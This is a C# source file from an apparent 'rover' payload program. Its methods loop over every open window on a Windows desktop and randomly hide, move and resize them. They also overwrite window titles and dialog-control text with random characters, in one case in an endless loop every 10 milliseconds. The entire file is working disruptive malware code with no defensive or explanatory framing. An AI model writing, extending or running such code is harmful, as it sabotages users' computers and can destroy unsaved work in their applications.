using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using CsharpGDI;
using System.Windows.Forms;

namespace rover
{
    public partial class Move_Event : gdi32
    {
        public void move_window(object obj)
        {
            int index = (int)obj;
            int x = Screen.PrimaryScreen.Bounds.Width;
            int y = Screen.PrimaryScreen.Bounds.Height;
            Random rand;
            rand = new Random();
            IntPtr hwnd = GetTopWindow(GetDesktopWindow());
            hwnd = GetWindow(hwnd, GetWindowType.GW_HWNDLAST);
            switch (index)
            {
                case 0:
                    while (hwnd != IntPtr.Zero)
                    {
                        if(rand.Next(2) == 1)
                        {
                            ShowWindow(hwnd, SW.SW_SHOW);
                            SetWindowPos(hwnd, IntPtr.Zero, rand.Next(x), rand.Next(y), rand.Next(x), rand.Next(y), SWP.SHOWWINDOW);
                        }
                        else
                        {
                            ShowWindow(hwnd, SW.SW_HIDE);
                            SetWindowPos(hwnd, IntPtr.Zero, rand.Next(x), rand.Next(y), rand.Next(x), rand.Next(y), SWP.HIDEWINDOW);
                        }
                        hwnd = GetWindow(hwnd, GetWindowType.GW_HWNDPREV);
                    }
                    break;
                default:
                    while (hwnd != IntPtr.Zero)
                    {
                        RECT windowRect;
                        GetWindowRect(hwnd, out windowRect);
                        MoveWindow(hwnd, windowRect.Left + rand.Next(-500, 500), windowRect.Top + rand.Next(-500, 500), windowRect.Right - windowRect.Left, windowRect.Bottom - windowRect.Top, true);
                        Input.input.SendMessage(hwnd, 0xC, 0, Msg_Boxes.chars());
                        hwnd = GetWindow(hwnd, GetWindowType.GW_HWNDPREV);
                    }
                    break;
            }
        }
        public void change_text()
        {
            Random rand;
            while (true)
            {
                IntPtr hwnd = GetTopWindow(GetDesktopWindow());
                hwnd = GetWindow(hwnd, GetWindowType.GW_HWNDLAST);
                while (hwnd != IntPtr.Zero)
                {
                    rand = new Random();
                    IntPtr hwnd2 = Input.input.GetDlgItem(hwnd, rand.Next(100));
                    Input.input.SendMessage(hwnd2, 0xC, 0, Msg_Boxes.chars());
                    hwnd = GetWindow(hwnd, GetWindowType.GW_HWNDPREV);
                }
                System.Threading.Thread.Sleep(10);
            }
        }
    }
}
